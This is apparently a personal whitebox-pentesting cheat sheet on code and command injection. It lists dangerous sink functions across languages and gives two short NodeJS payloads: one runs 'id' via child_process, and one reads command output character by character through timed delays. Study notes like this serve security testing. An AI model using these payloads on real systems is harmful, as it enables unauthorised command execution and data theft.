I hate coding, I hate NodeJS, I hate, me hatred, me rage
# Code/Command Injection Functions

To identify a command/code injection vulnerability during a Whitebox Pentesting exercise, we can look for functions executing system commands or evaluating language code, especially if user input is entering them. The following are some of the functions that would do so "highlighted ones are for Code Injection, while others are for Command Injection":

|**JavaScript 'NodeJS'**|**Python**|**PHP**|**C/C++**|**C#**|**Java**|
|---|---|---|---|---|---|
|**eval**|**eval**|**eval**|execlp|||
|**Function**|exec|exec|execvp|||
|**setInterval**|subprocess.open|proc_open|ShellExecute|||
|**setTimeout**|subprocess.run|popen||||
|**constructor.constructor**|os.system|shell_exec||||
|child_process.exec|os.popen|passthru|system|System.Diagnostics.Process.Start|Runtime.getRuntime().exec|
|child_process.spawn||system|popen|||

User input going into such functions should always lead to further testing to ensure it is safely validated and sanitized. User input may also indirectly affect these and should be tested as a form of `Second-order attacks`

```js
require('child_process').execSync('id').toString()
```

## Time-based output brute force

`<N>` is character position, starts with `0`. This code sleeps for 2 sec.

Usually `Node` likes to do things async, so it will just respond without actually sleeping.

```js
require("child_process").execSync("ls").toString()[<N>] == "a"
  ? new Promise((resolve) => setTimeout(resolve, 2000))
  : null;
```